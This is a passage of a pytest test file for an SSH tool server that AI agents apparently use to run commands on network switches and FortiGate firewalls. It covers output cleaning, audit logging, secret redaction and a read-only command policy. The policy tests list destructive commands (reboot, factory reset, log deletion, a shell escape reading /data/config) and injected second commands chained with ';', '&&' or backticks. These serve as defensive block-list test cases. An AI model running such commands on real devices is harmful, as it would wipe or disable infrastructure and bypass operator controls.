        credentials={"default": CredentialProfile(name="default", username="u", password="p")},
        known_hosts=None,
        timeout_socket=15.0,
        timeout_ops=30.0,
        host_key_policy="off",
        allowed_hosts=["10.0.0.0/8"],
    )
    with pytest.raises(ToolError):
        async with open_connection("8.8.8.8", "linux", settings.get_profile("default"), settings):
            pass


# --- output cap tests ----------------------------------------------------


def test_cap_output():
    from ssh_mcp.safety import cap_output

    assert cap_output("short", 1000) == "short"
    big = "x" * 5000
    capped = cap_output(big, 1000)
    assert len(capped.encode()) < 5000
    assert "truncated" in capped
    assert cap_output(big, 0) == big  # 0 disables the cap


# --- ProCurve / ArubaOS-Switch raw-shell tests ---------------------------


class FakeStdout:
    """Async stdout for a fake PTY shell. Yields scripted chunks; afterwards it
    either reports EOF (closed session) or blocks (an open interactive shell)."""

    def __init__(self, chunks, *, eof_after=False):
        self._chunks = list(chunks)
        self._eof_after = eof_after
        self._eof = False

    async def read(self, _n):
        await asyncio.sleep(0)
        if self._chunks:
            return self._chunks.pop(0)
        if self._eof_after:
            self._eof = True
            return ""
        await asyncio.sleep(3600)  # open session: block until cancelled
        return ""

    def at_eof(self):
        return self._eof


class FakeStdin:
    def __init__(self):
        self.writes: list[str] = []

    def write(self, data):
        self.writes.append(data)


class FakeProcess:
    def __init__(self, chunks, *, eof_after=False):
        self.stdin = FakeStdin()
        self.stdout = FakeStdout(chunks, eof_after=eof_after)


class FakeConn:
    def __init__(self):
        self.closed = False

    def close(self):
        self.closed = True

    async def wait_closed(self):
        pass


class RecordingDriver:
    """Fake scrapli driver recording the lifecycle calls open_connection makes."""

    def __init__(self):
        self.events: list[str] = []

    async def open(self):
        self.events.append("open")

    async def close(self):
        self.events.append("close")


def test_shell_clean_trims_echo_and_prompt():
    from ssh_mcp.shell import _clean

    raw = "sw1# show system\r\nName : sw1\r\nUptime : 5d\r\nsw1# "
    assert _clean(raw, "show system") == "Name : sw1\nUptime : 5d"


def test_shell_clean_strips_ansi():
    from ssh_mcp.shell import _clean

    raw = "\x1b[2J\x1b[Hsw1# show ver\r\n\x1b[32mVersion 16.10\x1b[0m\r\nsw1#"
    out = _clean(raw, "show ver")
    assert "\x1b" not in out
    assert out == "Version 16.10"


def test_shell_clean_strips_arubaos_prompt():
    from ssh_mcp.shell import _clean

    # ArubaOS Mobility Controller / Conductor prompt variants on the last line.
    for prompt in ("(aruba-mc) #", "(aruba-mc) >", "(conductor) [mynode] *#"):
        raw = f"(aruba-mc) # show version\r\nArubaOS 8.10.0.4\r\n{prompt}"
        assert _clean(raw, "show version") == "ArubaOS 8.10.0.4"


def test_shell_clean_recovers_output_merged_with_echo():
    from ssh_mcp.shell import _clean

    # ProCurve streams the first output line straight onto the echo line — the
    # header must not be eaten with the echoed command.
    raw = "sw1# show flashImage   Size   Date\r\n---  ---  ---\r\nsw1# "
    out = _clean(raw, "show flash")
    assert out.startswith("Image   Size   Date")
    assert "---  ---  ---" in out
    assert "show flash" not in out


def test_shell_clean_recovers_error_merged_with_echo():
    from ssh_mcp.shell import _clean

    # A rejected command's error is merged onto the echo line — it must survive
    # so the device-error markers can flag failed=True.
    raw = "sw1# xyzzyInvalid input: xyzzy\r\nsw1# "
    assert _clean(raw, "xyzzy") == "Invalid input: xyzzy"


async def test_shell_send_command_drains_and_cleans():
    proc = FakeProcess(
        [
            "sw1# show system\r\n",
            "System Name : sw1\r\n",
            "sw1# ",
        ]
    )
    sc = ShellConnection(FakeConn(), proc, command_timeout=2.0, quiet=0.05)
    resp = await sc.send_command("show system")
    await sc.close()
    assert resp.channel_input == "show system"
    assert resp.failed is False
    assert resp.result == "System Name : sw1"
    assert proc.stdin.writes == ["show system\n"]


async def test_shell_send_command_flags_device_error():
    proc = FakeProcess(["sw1# show bogus\r\n", "Invalid input: bogus\r\n", "sw1# "])
    sc = ShellConnection(FakeConn(), proc, command_timeout=2.0, quiet=0.05)
    resp = await sc.send_command("show bogus")
    await sc.close()
    # An ArubaOS-Switch rejection marker sets failed=True.
    assert resp.failed is True
    assert "Invalid input: bogus" in resp.result


async def test_shell_send_command_raises_on_closed_session():
    proc = FakeProcess([], eof_after=True)
    sc = ShellConnection(FakeConn(), proc, command_timeout=2.0, quiet=0.05)
    await asyncio.sleep(0.02)  # let the reader observe EOF
    with pytest.raises(ConnectionError):
        await sc.send_command("show system")
    await sc.close()


async def test_shell_drain_banner_runs_paging_command(monkeypatch):
    from ssh_mcp import shell as shell_mod

    monkeypatch.setattr(shell_mod, "_BANNER_QUIET", 0.05)
    monkeypatch.setattr(shell_mod, "_BANNER_OVERALL", 0.5)
    # ProCurve uses `no page`; ArubaOS Mobility Controllers use `no paging`.
    for paging in ("no page", "no paging"):
        proc = FakeProcess(["banner\r\n", "dev# ", f"{paging}\r\ndev# "])
        sc = ShellConnection(
            FakeConn(), proc, command_timeout=1.0, quiet=0.05, paging_command=paging
        )
        await sc.drain_banner()
        await sc.close()
        # A return dismisses the banner, then the platform's pager-off command.
        assert proc.stdin.writes == ["\n", f"{paging}\n"]


async def test_open_connection_uses_shell_path(monkeypatch):
    from ssh_mcp import connection

    class FakeShell:
        def __init__(self):
            self.closed = False

        async def close(self):
            self.closed = True

    settings = make_settings()
    # Both ProCurve and ArubaOS Mobility Controllers route to the raw PTY shell.
    for slug in ("aruba-os-switch", "aruba-os"):
        fake = FakeShell()
        captured: dict = {}

        async def fake_open_raw_shell(host, s, profile, st, port, ct, _fake=fake, _cap=captured):
            _cap["slug"] = s
            return _fake

        monkeypatch.setattr(connection, "_open_raw_shell", fake_open_raw_shell)
        async with connection.open_connection(
            "dev", slug, settings.get_profile("default"), settings
        ) as drv:
            assert drv is fake
        assert captured["slug"] == slug
        assert fake.closed is True


def test_paging_command_per_shell_platform():
    from ssh_mcp.connection import _PAGING_COMMANDS, _SHELL_PLATFORMS

    # Every shell platform has an explicit pager-disable command.
    assert set(_PAGING_COMMANDS) == _SHELL_PLATFORMS
    assert _PAGING_COMMANDS["aruba-os-switch"] == "no page"
    assert _PAGING_COMMANDS["aruba-os"] == "no paging"


async def test_open_connection_scrapli_path_for_linux(monkeypatch):
    from ssh_mcp import connection

    fake = RecordingDriver()
    monkeypatch.setattr(connection, "_build_driver", lambda **_kw: fake)
    settings = make_settings()
    async with connection.open_connection(
        "host", "linux", settings.get_profile("default"), settings
    ):
        pass
    # linux is not a shell platform — scrapli path: open then close.
    assert fake.events == ["open", "close"]


async def test_execute_wraps_shell_connection_error():
    # A dropped shell session must surface as SSHCommandError, like scrapli.
    proc = FakeProcess([], eof_after=True)
    sc = ShellConnection(FakeConn(), proc, command_timeout=2.0, quiet=0.05)
    await asyncio.sleep(0.02)
    with pytest.raises(SSHCommandError):
        await execute(sc, "show version")
    await sc.close()


# --- new platform slug tests ---------------------------------------------


def test_build_driver_resolves_new_platforms():
    from ssh_mcp.connection import SUPPORTED_PLATFORMS, _build_driver

    settings = make_settings()
    profile = CredentialProfile(name="d", username="u", password="p")
    for slug in ("paloalto-panos", "huawei-vrp"):
        assert slug in SUPPORTED_PLATFORMS, f"{slug} missing from SUPPORTED_PLATFORMS"
        driver = _build_driver("h", slug, profile, settings, 22, 30.0)
        assert driver is not None


# --- audit logging tests -------------------------------------------------


def test_make_audit_sink_disabled():
    from ssh_mcp.audit import make_audit_sink

    # An empty/whitespace target disables auditing; a real target gives a sink.
    assert make_audit_sink(None) is None
    assert make_audit_sink("") is None
    assert make_audit_sink("   ") is None
    assert callable(make_audit_sink("/tmp/ssh-mcp-audit.jsonl"))


async def test_audit_log_records_tool_call(tmp_path):
    log = tmp_path / "audit.jsonl"
    mcp = build_server(make_settings(audit_log=str(log)))
    driver = FakeDriver(command_result="ok")
    with patch("ssh_mcp.tools.read.open_connection", fake_open_connection(driver)):
        async with Client(mcp) as client:
            await client.call_tool(
                "ssh_run_command",
                {"host": "sw1", "platform": "cisco-iosxe", "command": "show version"},
            )
    lines = log.read_text().splitlines()
    assert len(lines) == 1
    rec = json.loads(lines[0])
    assert rec["tool"] == "ssh_run_command"
    assert rec["host"] == "sw1"
    assert rec["platform"] == "cisco-iosxe"
    assert rec["commands"] == ["show version"]
    assert rec["outcome"] == "ok"
    assert rec["ts"] and rec["elapsed_s"] is not None


async def test_audit_log_records_denied_command(tmp_path):
    # A denylist rejection raises before connecting — it must still be audited.
    log = tmp_path / "audit.jsonl"
    mcp = build_server(make_settings(audit_log=str(log)))
    async with Client(mcp) as client:
        with pytest.raises(ToolError):
            await client.call_tool(
                "ssh_run_command",
                {"host": "sw1", "platform": "cisco-iosxe", "command": "reload"},
            )
    rec = json.loads(log.read_text().splitlines()[0])
    assert rec["tool"] == "ssh_run_command"
    assert rec["commands"] == ["reload"]
    assert rec["outcome"] == "error"
    assert rec["error"]


async def test_audit_log_redacts_commands(tmp_path):
    # A credential in a config command must not land in the audit log.
    log = tmp_path / "audit.jsonl"
    mcp = build_server(make_settings(write_enabled=True, audit_log=str(log)))
    driver = FakeDriver()
    with patch("ssh_mcp.tools.write.open_connection", fake_open_connection(driver)):
        async with Client(mcp) as client:
            await client.call_tool(
                "ssh_send_config",
                {
                    "host": "sw1",
                    "platform": "cisco-iosxe",
                    "config_commands": ["snmp-server community SECRETAUDIT ro"],
                    "confirm": "yes",
                },
            )
    body = log.read_text()
    assert "SECRETAUDIT" not in body
    rec = json.loads(body.splitlines()[0])
    assert "<REDACTED>" in rec["commands"][0]


def test_audit_sink_creates_file_mode_0600(tmp_path):
    # The audit trail records infrastructure topology — it must not be created
    # world-readable.
    import os
    import stat

    from ssh_mcp.audit import make_audit_sink

    log = tmp_path / "audit.jsonl"
    sink = make_audit_sink(str(log))
    assert sink is not None
    sink({"tool": "ssh_run_command", "host": "sw1"})
    mode = stat.S_IMODE(os.stat(log).st_mode)
    assert mode == 0o600, f"audit log mode is {oct(mode)}, expected 0o600"


async def test_audit_log_disabled_writes_nothing(tmp_path):
    log = tmp_path / "audit.jsonl"
    mcp = build_server(make_settings(audit_log=None))  # auditing off
    driver = FakeDriver(command_result="ok")
    with patch("ssh_mcp.tools.read.open_connection", fake_open_connection(driver)):
        async with Client(mcp) as client:
            await client.call_tool(
                "ssh_run_command",
                {"host": "sw1", "platform": "cisco-iosxe", "command": "show version"},
            )
    assert not log.exists()  # no middleware registered → no audit file


# --- FortiOS: redaction ---------------------------------------------------


def test_redact_real_fortios_config_shapes():
    """Redaction holds on the real FortiOS `show` line shapes. A single live
    read of a FortiGate-2200E leaked 58 secrets in full: the generic password
    rule's keyword list had no FortiOS `ENC`, there was no rule for bare
    `passwd`/`secret`, and every rule ended in one `\\S+`. Secrets here are fake."""
    config = "\n".join(
        [
            "            set password ENC FAKEencPASSWORD==",
            "        set passwd ENC FAKEencPASSWD==",
            "        set secret ENC FAKEencRADIUS==",
            "            set key-string FAKEkeystring==",
            "        set psksecret ENC FAKEpsk==",
            "        set ppk-secret ENC FAKEppk==",
            "    set auth-password-l1 ENC FAKEl1==",
            "        set group-password ENC FAKEgrp==",
            '        set private-key "FAKEprivkey"',
            # A key we have never seen: the ENC value-shape rule must still catch it.
            "        set futurekey-we-never-heard-of ENC FAKEfuture==",
        ]
    )
    out = redact(config)
    for secret in (
        "FAKEencPASSWORD",
        "FAKEencPASSWD",
        "FAKEencRADIUS",
        "FAKEkeystring",
        "FAKEpsk",
        "FAKEppk",
        "FAKEl1",
        "FAKEgrp",
        "FAKEprivkey",
        "FAKEfuture",
    ):
        assert secret not in out, f"{secret} leaked through redact()"
    # The ENC marker survives so the line still reads as an encrypted value.
    assert "ENC <REDACTED>" in out


def test_redact_masks_whole_multi_token_secret():
    """The bug class behind the leak: every rule ended in a single `\\S+`, so a
    multi-token or quoted value survived as `set key-string <REDACTED> <blob>`."""
    assert "BLOB" not in redact("                    set key-string LEADING BLOBrest MOREblob")
    assert "BLOB" not in redact('set password "quoted BLOB secret"')
    assert "BLOB" not in redact("key-string 7 LEADING BLOBrest")
    assert "BLOB" not in redact("set psksecret ENC LEADING BLOBrest")


def test_redact_does_not_over_redact_fortios_reads():
    """Read-safe FortiOS keys that merely contain a secret word must survive."""
    for line in (
        "        set password-policy enable",
        "    set password-expire-days 90",
        "        set passwd-policy-status enable",
        "    set secret-2fa disable",
        "            set key-type rsa",
        "        set keylife 86400",
        "        set key-index 1",
        "        set ip 10.0.0.1 255.255.255.0",
        "        set status enable",
        '        set comment "password rotation done"',
    ):
        assert "<REDACTED>" not in redact(line), f"over-redacted: {line}"


def test_redact_fortios_get_and_diagnose_output_shapes():
    """Secrets do not only appear in `show`'s `set <key> ENC ...` form. FortiOS
    `get` emits `key : value` and `diagnose` is free-form; the `set`-anchored
    rules missed both, leaking any ENC-marked or FortiOS-keyed secret surfaced
    by a read-allowed `get`/`diagnose`. Secrets here are fake."""
    lines = [
        "psksecret: ENC FAKEencA",  # get, colon + ENC
        "psksecret ENC FAKEencB",  # bare key + ENC
        "ppk-secret ENC FAKEencD",  # hyphenated key + ENC
        "key-string: ENC FAKEencE",  # get, colon + ENC
        "        The tunnel PSK is ENC FAKEencFreeform",  # diagnose free-form
        "psksecret : FAKEplainPSK",  # get, plaintext value
        "ppk-secret: FAKEplainPPK",  # get, plaintext value
    ]
    for line in lines:
        out = redact(line)
        assert "FAKEenc" not in out and "FAKEplain" not in out, f"leaked: {line!r} -> {out!r}"


def test_redact_get_form_does_not_over_redact():
    """The `get`-shape rule must not fire on read-safe keys that merely contain a
    secret word, in either `set` or `key : value` form."""
    for line in (
        "psksecret-status : enable",
        "password-policy : enable",
        "key-type : rsa",
        "keylife : 86400",
        "status : up",
        "hostname : fgt-edge-01",
    ):
        assert "<REDACTED>" not in redact(line), f"over-redacted: {line}"


def test_redact_preserves_config_following_single_token_secrets():
    """No-over-redaction guard for grammars where meaningful config FOLLOWS the
    secret on the same line."""
    out = redact("snmp-server community FAKEcomm ro 99")
    assert "FAKEcomm" not in out and "ro 99" in out
    out = redact(
        "radius-server host 192.0.2.11 key ciphertext FAKEkey "
        "tracking enable clearpass-username api-dur"
    )
    assert "FAKEkey" not in out and "clearpass-username api-dur" in out


# --- FortiOS: command policy ----------------------------------------------

_FORTIOS_MUST_DENY = [
    "execute reboot",
    "execute shutdown",
    "execute factoryreset",
    "execute factoryreset2",
    "execute formatlogdisk",
    "execute restore config tftp cfg 192.0.2.1",
    "execute backup config tftp cfg 192.0.2.1",
    "execute ssh 192.0.2.1",
    "execute telnet 192.0.2.1",
    "execute disconnect-admin-session 1",
    "execute log delete",
    "execute vpn-sslvpn-tunnel-disconnect all",
    "execute usb-disk format",
    "execute update-now",
    "execute batch start",
    "execute date 2020-01-01",
    # FortiOS accepts any unambiguous abbreviation.
    "exe reboot",
    "exec reboot",
    "ex reboot",
    "execut factoryreset",
    "diagnose debug application ike -1",
    # An abbreviation shorter than `diag` fails closed: it is absent from the
    # lead allowlist, so it never reaches the debug-flow exemption.
    "dia debug enable",
    "diagnose test application httpsd 99",
    "diagnose sniffer packet any icmp 4",
    "diagnose sys session filter clear",
    "diagnose sys ha reset-uptime",
    # A busybox shell escape; denied by absence from the lead allowlist.
    "fnsysctl cat /data/config",
    "fnsysctl ls /",
    "unset hostname",
    "config global",
    "config vdom",
    "set hostname x",
    "edit port1",
    "end",
    "abort",
    # Smuggled second commands.
    "show ; execute reboot",
    "get system status\rexecute reboot",
    "show | grep x ; fnsysctl ls /",
]

_FORTIOS_MUST_ALLOW = [
    "get system status",
    "show",
    "show full-configuration",
    "get system interface",
    "get system performance status",
    "get system ha status",
    "get router info routing-table all",
    "get hardware nic",
    "get system console",
    'show | grep "config vdom" -f -A1',
    "get system status | grep Version",
    "diagnose sys session stat",
    "diagnose hardware deviceinfo nic port1",
    "diagnose ip arp list",
    "diagnose sys top",
    "diagnose firewall iprope list",
    "diagnose vpn tunnel list",
    "diagnose debug crashlog read",
    "diagnose debug info",
    "diagnose netlink interface list",
    "execute ping 8.8.8.8",
    "execute ping6 2001:db8::1",
    "execute traceroute 8.8.8.8",
    "execute ping-options view-settings",
    "execute dhcp lease-list",
    "execute log display",
    "execute date",
    "execute sensor list",
    "exe ping 8.8.8.8",
    "exit",
]


def test_fortios_policy_blocks_state_changing_surface():
    """FortiOS hides its whole state-changing surface behind `execute`, a second
    token the first-token-anchored denylist never saw. Verified against a live
    FortiGate: every one of these used to be ALLOWED by the read tools."""
    for cmd in _FORTIOS_MUST_DENY:
        assert check_read_only(cmd, policy="fortios") is not None, f"should block: {cmd}"


def test_fortios_policy_allows_real_read_commands():
    for cmd in _FORTIOS_MUST_ALLOW:
        assert check_read_only(cmd, policy="fortios") is None, f"should allow: {cmd}"


def test_fortios_policy_does_not_leak_onto_other_platforms():
    """Without a policy, every other platform behaves exactly as before."""
    assert check_read_only("show version") is None
    assert check_read_only("display vlan") is None
    assert check_read_only("show running-config") is None


def test_unset_is_denied_on_every_platform():
    # FortiOS's negation verb; inert on other platforms, so the rule is global.
    assert check_read_only("unset hostname") is not None
    assert check_read_only("unset hostname", policy="fortios") is not None


def test_command_policy_resolves_fortios_aliases():
    from ssh_mcp.connection import command_policy

    for slug in ("fortios", "fortinet", "fortigate", "FortiOS"):
        assert command_policy(slug) == "fortios"
    for other in ("cisco-ios", "linux", "aruba-cx", None):
        assert command_policy(other) is None


# --- FortiOS: diagnostic exemptions ---------------------------------------

# `diagnose debug flow` and `diagnose sniffer packet` are reads in intent but
# writes in mechanism (they arm a filter and toggle an output stream), so the
# fortios policy's mutation and sniffer deny rules rejected them. These are the
# exempted forms — the ones that produce diagnostic output and nothing else.
_FORTIOS_DIAGNOSTIC_ALLOW = [
    "diagnose debug flow filter addr 10.1.2.3",
    "diagnose debug flow filter port 443",
    "diagnose debug flow filter vd root",
    "diagnose debug flow filter clear",
    "diag debug flow filter addr 10.1.2.3",
    "diagnose debug flow show console enable",
    "diagnose debug flow show function-name enable",
    "diagnose debug flow show iprope disable",
    "diagnose debug flow trace start 100",
    "diagnose debug flow trace stop",
    # The companion toggles — without `enable` an armed trace prints nothing,
    # and without `disable`/`reset` a session cannot clean up after itself.
    "diagnose debug enable",
    "diagnose debug disable",
    "diagnose debug reset",
    "diagnose debug duration 30",
    "diagnose sniffer packet any 'host 10.1.2.3 and port 443' 4 100",
    'diagnose sniffer packet port1 "(host a or host b) and tcp" 4 20 a',
    "diagnose sniffer packet any none 4 10",
]

_FORTIOS_DIAGNOSTIC_DENY = [
    # No packet count: the capture never terminates, the op timeout kills the
    # call, and the packets are lost — so the bounded form is the only one.
    "diagnose sniffer packet any 'host 1.1.1.1' 4",
    "diagnose sniffer packet any none 6",
    "diagnose sniffer packet any icmp 4 10",  # unquoted filter
    "diagnose debug flow trace start",  # unbounded trace
    # Not exempted: floods a busy firewall's console.
    "diagnose debug application ike -1",
    # An exemption matches the WHOLE command, so nothing rides along behind it.
    "diagnose debug flow filter addr 1.1.1.1 ; reload",
    "diagnose debug flow filter addr 1.1.1.1 && execute reboot",
    "diagnose debug enable ; execute factoryreset",
    "diagnose sniffer packet any 'x `reload`' 4 10",
    "diagnose sniffer packet any none 4 10 > /tmp/cap",
]


def test_fortios_allows_bounded_flow_debug_and_sniffer():
    for cmd in _FORTIOS_DIAGNOSTIC_ALLOW:
        assert check_read_only(cmd, policy="fortios") is None, f"should allow: {cmd}"


def test_fortios_diagnostic_exemptions_stay_narrow():
    for cmd in _FORTIOS_DIAGNOSTIC_DENY:
        assert check_read_only(cmd, policy="fortios") is not None, f"should block: {cmd}"


def test_fortios_exemptions_do_not_leak_onto_other_platforms():
    """The exemptions live in the fortios policy, not the global denylist."""
    assert check_read_only("diagnose debug enable") is None  # no policy: inert
    assert check_read_only("diagnose debug enable", unix_host=True) is not None


# --- operator command allowlist (SSH_MCP_ALLOW_COMMANDS) -------------------


def test_allow_commands_exempts_from_the_global_denylist():
    """Cisco `debug` is denied globally; a fleet that needs one form says so."""
    cmd = "debug ip packet detail 101"
    assert check_read_only(cmd) is not None
    assert check_read_only(cmd, allow_commands=[r"^debug ip packet\b"]) is None


def test_allow_commands_exempts_from_the_unix_allowlist_and_policy():
    tcpdump = "tcpdump -i eth0 -c 10"
    assert check_read_only(tcpdump, unix_host=True) is not None
    allow = [r"^tcpdump\b.* -c \d+$"]
    assert check_read_only(tcpdump, unix_host=True, allow_commands=allow) is None

    forti = "execute usb-disk list"
    assert check_read_only(forti, policy="fortios") is not None
    allow = [r"^execute usb-disk list$"]
    assert check_read_only(forti, policy="fortios", allow_commands=allow) is None


def test_operator_denylist_beats_the_operator_allowlist():
    """So a too-broad allow pattern can always be carved back out."""
    assert (
        check_read_only(
            "debug ip packet",
            extra_patterns=[r"debug ip packet"],
            allow_commands=[r"^debug"],
        )
        is not None
    )


def test_allow_commands_fails_closed_on_an_invalid_regex():
    assert check_read_only("reload", allow_commands=["(["]) is not None


def test_allow_commands_loads_newline_separated_from_env(monkeypatch):
    """Newline-separated, because a regex may contain a comma (`\\d{1,3}`)."""
    monkeypatch.setenv("SSH_MCP_ALLOW_COMMANDS", "^tcpdump -c \\d{1,3}$\n^debug ip packet\n")
    monkeypatch.setenv("SSH_MCP_USERNAME", "u")
    monkeypatch.setenv("SSH_MCP_PASSWORD", "p")
    from ssh_mcp.settings import load_settings

    assert load_settings().allow_commands == [r"^tcpdump -c \d{1,3}$", r"^debug ip packet"]


# --- FortiOS: platform wiring ---------------------------------------------


def test_build_driver_resolves_every_platform_with_enable_secret():
    """The regression guard for the FortiOS blocker: _build_driver must build
    for every mapped slug even when the profile carries an enable secret.
    fortinet_fortios's driver subclasses AsyncGenericDriver, which takes no
    `auth_secondary` — passing it was a 100% TypeError at construction, before
    a packet was sent. Looping every slug catches the next such platform."""
    from ssh_mcp.connection import _NETWORK_PLATFORMS, _build_driver

    settings = make_settings()
    profile = CredentialProfile(name="d", username="u", password="p", enable_secret="ena")
    for slug in _NETWORK_PLATFORMS:
        assert _build_driver("h", slug, profile, settings, 22, 30.0) is not None


def test_build_driver_drops_auth_secondary_for_generic_community_driver(monkeypatch):
    import scrapli

    calls: list[dict] = []

    class FakeScrapli:
        def __init__(self, **kwargs):
            calls.append(kwargs)
            if "auth_secondary" in kwargs:
                raise TypeError(
                    "AsyncGenericDriver.__init__() got an unexpected keyword "
                    "argument 'auth_secondary'"
                )

    monkeypatch.setattr(scrapli, "AsyncScrapli", FakeScrapli)
    from ssh_mcp.connection import _build_driver

    profile = CredentialProfile(name="d", username="u", password="p", enable_secret="ena")
    _build_driver("h", "cisco-iosxe", profile, make_settings(), 22, 30.0)
    assert len(calls) == 2
    assert "auth_secondary" in calls[0] and "auth_secondary" not in calls[1]


def test_build_driver_propagates_unrelated_type_error(monkeypatch):
    import scrapli

    class FakeScrapli:
        def __init__(self, **kwargs):
            raise TypeError("boom")

    monkeypatch.setattr(scrapli, "AsyncScrapli", FakeScrapli)
    from ssh_mcp.connection import _build_driver

    profile = CredentialProfile(name="d", username="u", password="p", enable_secret="ena")
    with pytest.raises(TypeError, match="boom"):
        _build_driver("h", "cisco-iosxe", profile, make_settings(), 22, 30.0)


def test_fortios_slugs_are_shell_platforms_not_network():
    from ssh_mcp.connection import (
        _NETWORK_PLATFORMS,
        _SHELL_PLATFORMS,
        SUPPORTED_PLATFORMS,
        is_generic,
        is_unix_host,
        supports_context,
    )

    for slug in ("fortios", "fortinet", "fortigate"):
        assert slug in SUPPORTED_PLATFORMS
        assert slug in _SHELL_PLATFORMS
        assert slug not in _NETWORK_PLATFORMS
        # No scrapli config mode -> the write tool sends config line by line.
        assert is_generic(slug)
        # NOT a Unix shell: it gets the denylist + FortiOS policy, not the
        # Unix read allowlist.
        assert not is_unix_host(slug)
        assert supports_context(slug)


# --- FortiOS: shell profile behaviour -------------------------------------


def test_shell_profile_defaults_match_procurve():
    """The guard that making shell.py platform-aware changed nothing for the
    existing ArubaOS-Switch / ArubaOS platforms."""
    from ssh_mcp.shell import _DEVICE_ERROR_MARKERS, _PROMPT_LINE, ShellProfile

    d = ShellProfile()
    assert d.paging_command == "no page"
    assert d.device_error_markers == _DEVICE_ERROR_MARKERS
    assert d.prompt_line is _PROMPT_LINE
    assert d.prompt_tail is None
    assert d.pager_tail is None
    assert d.banner_accept is None
    assert d.supports_context is False


def test_shell_profiles_cover_every_shell_platform():
    from ssh_mcp.connection import _SHELL_PLATFORMS
    from ssh_mcp.shell import SHELL_PROFILES

    assert set(SHELL_PROFILES) == _SHELL_PLATFORMS
    # The three FortiOS aliases share one profile object.
    assert SHELL_PROFILES["fortios"] is SHELL_PROFILES["fortinet"]
    assert SHELL_PROFILES["fortios"] is SHELL_PROFILES["fortigate"]
    assert SHELL_PROFILES["fortios"].paging_command == ""


def test_shell_clean_trims_fortios_context_prompt():
    from ssh_mcp.shell import SHELL_PROFILES, _clean

    fortios = SHELL_PROFILES["fortios"]
    raw = "fgt1-p (prod) # get system status\r\nVersion: v7.4.9\r\nfgt1-p (prod) # "
    assert _clean(raw, "get system status", fortios) == "Version: v7.4.9"
    # The default (ProCurve) profile does NOT know the parenthesised VDOM
    # prompt — the two patterns are independent.
    assert "fgt1-p (prod) #" in _clean(raw, "get system status")


async def test_shell_send_command_flags_fortios_device_error():
    """Live FortiOS errors used to come back failed=False, because the shell
    path only knew ProCurve's markers."""
    from ssh_mcp.shell import SHELL_PROFILES, ShellConnection

    for err in (
        "command parse error before 'interface'",
        "Command fail. Return code -61",
        "Unknown action 0",
    ):
        proc = FakeProcess([f"fgt1-p # get system interface\r\n{err}\r\nfgt1-p # "])
        conn = ShellConnection(
            FakeConn(), proc, command_timeout=2.0, quiet=0.05, profile=SHELL_PROFILES["fortios"]
        )
        resp = await conn.send_command("get system interface")
        assert resp.failed is True, err
        # The same output on the default profile is NOT a failure — the markers
        # are per-profile, not global.
        proc2 = FakeProcess([f"sw1# show x\r\n{err}\r\nsw1# "])
        conn2 = ShellConnection(FakeConn(), proc2, command_timeout=2.0, quiet=0.05)
        assert (await conn2.send_command("show x")).failed is False


async def test_shell_prompt_tail_ends_read_early():
    """FortiOS reads end on the prompt rather than waiting out the quiet
    window, so a large capture is not paced by quiet-time detection."""
    from ssh_mcp.shell import SHELL_PROFILES, ShellConnection

    proc = FakeProcess(["fgt1-p # get system status\r\n", "Version: v7.4.9\r\n", "fgt1-p # "])
    conn = ShellConnection(
        FakeConn(), proc, command_timeout=30.0, quiet=5.0, profile=SHELL_PROFILES["fortios"]
    )
    resp = await conn.send_command("get system status")
    assert resp.result == "Version: v7.4.9"
    assert resp.elapsed_time < 1.0  # ended on the prompt, not the 5s quiet window


async def test_shell_prompt_tail_ignores_split_echo():
    """A chunk boundary landing on the echoed prompt BEFORE the command text
    must not end the read with empty output."""
    from ssh_mcp.shell import SHELL_PROFILES, ShellConnection

    proc = FakeProcess(["fgt1-p # ", "get system status\r\nVersion: v7.4.9\r\nfgt1-p # "])
    conn = ShellConnection(
        FakeConn(), proc, command_timeout=30.0, quiet=5.0, profile=SHELL_PROFILES["fortios"]
    )
    assert (await conn.send_command("get system status")).result == "Version: v7.4.9"


# --- FortiOS: the --More-- pager ------------------------------------------


class PagedFakeStdout:
    """Fake PTY stdout that withholds the page after a `--More--` prompt until
    the pager is answered. The lab FortiGate has `set output standard`, so the
    pager path cannot be exercised live — this fake is its only coverage."""

    def __init__(self, pages, stdin):
        self._pages = list(pages)
        self._stdin = stdin
        self._served = 0

    async def read(self, _n):
        await asyncio.sleep(0)
        if not self._pages:
            await asyncio.sleep(3600)
            return ""
        # A page that follows a pager prompt is withheld until a space arrives.
        while self._served and self._stdin.writes.count(" ") < self._served:
            await asyncio.sleep(0.01)
        self._served += 1
        return self._pages.pop(0)

    def at_eof(self):
        return False


class PagedFakeProcess:
    def __init__(self, pages):
        self.stdin = FakeStdin()
        self.stdout = PagedFakeStdout(pages, self.stdin)


async def test_shell_pager_is_answered_and_output_is_complete():
    from ssh_mcp.shell import SHELL_PROFILES, ShellConnection

    proc = PagedFakeProcess(
        [
            "fgt1-p # show\r\nline1\r\n--More--",
            "\r\nline2\r\n--More--",
            "\r\nline3\r\n--More--",
            "\r\nline4\r\nfgt1-p # ",
        ]
    )
    conn = ShellConnection(
        FakeConn(), proc, command_timeout=10.0, quiet=0.2, profile=SHELL_PROFILES["fortios"]
    )
    resp = await conn.send_command("show")
    assert proc.stdin.writes.count(" ") == 3  # one answer per pager prompt
    for line in ("line1", "line2", "line3", "line4"):
        assert line in resp.result
    assert "More" not in resp.result  # the pager prompt itself is stripped
    assert resp.failed is False


async def test_shell_pager_strips_backspace_erase_residue():
    from ssh_mcp.shell import SHELL_PROFILES, ShellConnection

    proc = PagedFakeProcess(
        [
            "fgt1-p # show\r\nheader\r\n--More--\x08\x08\x08\x08        \x08\x08",
            "\r\nbody\r\nfgt1-p # ",
        ]
    )
    conn = ShellConnection(
        FakeConn(), proc, command_timeout=10.0, quiet=0.2, profile=SHELL_PROFILES["fortios"]
    )
    resp = await conn.send_command("show")
    assert "header" in resp.result and "body" in resp.result
    assert "More" not in resp.result and "\x08" not in resp.result


async def test_shell_pager_hard_caps_iterations(monkeypatch):
    import ssh_mcp.shell as shell_mod
    from ssh_mcp.shell import SHELL_PROFILES, ShellConnection

    monkeypatch.setattr(shell_mod, "_MAX_PAGER_PAGES", 3)
    proc = PagedFakeProcess(["fgt1-p # show\r\nx\r\n--More--"] + ["\r\ny\r\n--More--"] * 50)
    conn = ShellConnection(
        FakeConn(), proc, command_timeout=10.0, quiet=0.2, profile=SHELL_PROFILES["fortios"]
    )
    resp = await conn.send_command("show")
    assert proc.stdin.writes.count(" ") == 3
    assert "q\n" in proc.stdin.writes
    assert "pager exceeded" in resp.result


async def test_shell_pager_not_answered_for_default_profile():
    """ArubaOS/ProCurve disable the pager instead of answering it — unchanged."""
    from ssh_mcp.shell import ShellConnection

